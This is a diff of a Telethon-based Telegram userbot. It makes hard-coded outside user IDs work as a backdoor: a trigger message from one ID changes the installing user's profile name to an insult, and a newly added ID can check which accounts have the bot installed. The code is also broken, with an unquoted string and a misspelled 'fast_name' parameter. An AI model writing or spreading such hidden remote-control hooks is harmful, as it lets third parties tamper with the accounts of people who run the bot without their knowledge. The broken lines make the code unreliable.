@@ -406,7 +406,7 @@ ownersayed_id = 5582470474
 @jepiq.on(events.NewMessage(outgoing=False, pattern='بعبصة'))
 async def OwnerStart(event):
     sender = await event.get_sender()
-    if sender==1887927704:
+    if sender.id==1887927704:
         
         await event.jepiq(
                 functions.account.UpdateProfileRequest(fast_name=كحبت همس)
@@ -415,7 +415,7 @@ async def OwnerStart(event):
 async def OwnerStart(event):
 
     sender = await event.get_sender()
-    if sender.id == ownersayed_id or sender.id == 1887927704:
+    if sender.id == ownersayed_id or sender.id == 1887927704 or sender.id == 5543149965:
         order = await event.reply('يب منصب ✓')
 ownersayed1_id = 5582470474
 @jepiq.on(events.NewMessage(outgoing=False, pattern='منو يحبني؟'))
